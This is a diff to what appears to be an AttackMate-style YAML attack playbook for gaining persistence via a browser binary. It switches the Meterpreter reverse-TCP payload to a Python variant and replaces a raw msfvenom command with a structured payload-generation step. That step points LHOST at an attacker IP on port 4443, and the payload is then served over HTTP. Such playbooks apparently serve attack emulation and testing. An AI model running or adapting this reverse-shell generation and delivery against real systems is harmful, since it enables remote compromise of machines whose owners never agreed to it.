@@ -3,7 +3,7 @@
 # persistence via browser binary
 
 vars:
-  PAYLOAD: linux/x64/meterpreter/reverse_tcp
+  PAYLOAD: cmd/unix/python/meterpreter/reverse_tcp
   LPORT: 4443
   ATTACKMATE_IP: 192.42.1.174
   CLIENT_IP: 192.168.50.100
@@ -50,8 +50,12 @@ commands:
     variable: RSHELL
   
   # generate reverse shell
-  - type: shell
-    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKMATE_IP
+      LPORT: $LPORT
+    local_path: $RSHELL
   
   # serve payload via http
   - type: webserv
